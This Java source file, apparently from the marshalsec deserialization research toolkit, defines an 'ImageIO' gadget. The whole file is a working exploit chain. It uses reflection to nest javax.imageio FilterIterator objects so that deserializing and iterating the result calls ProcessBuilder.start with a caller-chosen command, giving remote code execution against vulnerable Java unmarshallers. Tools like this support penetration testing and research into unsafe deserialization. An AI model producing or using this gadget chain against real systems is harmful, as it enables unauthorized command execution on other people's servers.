/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Collections;

import marshalsec.MarshallerBase;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;


/**
 * @author mbechler
 *
 */
public interface ImageIO extends Gadget {

    @Args ( minArgs = 1, args = {
        "cmd", "args..."
    }, defaultArgs = {
        MarshallerBase.defaultExecutable
    } )
    @Primary
    default Object makeImageIO ( UtilFactory uf, String[] args ) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(args);
        Class<?> cfCl = Class.forName("javax.imageio.ImageIO$ContainsFilter");
        Constructor<?> cfCons = cfCl.getDeclaredConstructor(Method.class, String.class);
        cfCons.setAccessible(true);

        // nest two instances, the 'next' of the other one will be skipped,
        // the inner instance then provides the actual target object
        Object filterIt = makeFilterIterator(
            makeFilterIterator(Collections.emptyIterator(), pb, null),
            "foo",
            cfCons.newInstance(ProcessBuilder.class.getMethod("start"), "foo"));

        return uf.makeIteratorTrigger(filterIt);
    }


    public static Object makeFilterIterator ( Object backingIt, Object first, Object filter )
            throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
        Class<?> fiCl = Class.forName("javax.imageio.spi.FilterIterator");
        Object filterIt = Reflections.createWithoutConstructor(fiCl);
        Reflections.setFieldValue(filterIt, "iter", backingIt);
        Reflections.setFieldValue(filterIt, "next", first);
        Reflections.setFieldValue(filterIt, "filter", filter);
        return filterIt;
    }
}
